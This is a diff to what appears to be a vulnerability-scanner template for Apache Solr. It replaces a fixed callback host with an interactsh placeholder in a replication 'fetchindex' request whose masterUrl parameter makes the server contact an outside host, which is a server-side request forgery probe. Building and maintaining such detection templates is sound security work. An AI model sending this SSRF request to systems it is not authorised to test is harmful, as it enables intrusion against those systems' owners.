@@ -18,7 +18,7 @@ requests:
         Connection: close
 
       - |
-        GET /solr/%7Bcore%7D/replication/?command=fetchindex&masterUrl=https://bugbounty.requestcatcher.com/ssrf HTTP/1.1
+        GET /solr/%7Bcore%7D/replication/?command=fetchindex&masterUrl=https://{{interactsh-url}} HTTP/1.1
         Host: {{Hostname}}
         Accept-Language: en
         Connection: close
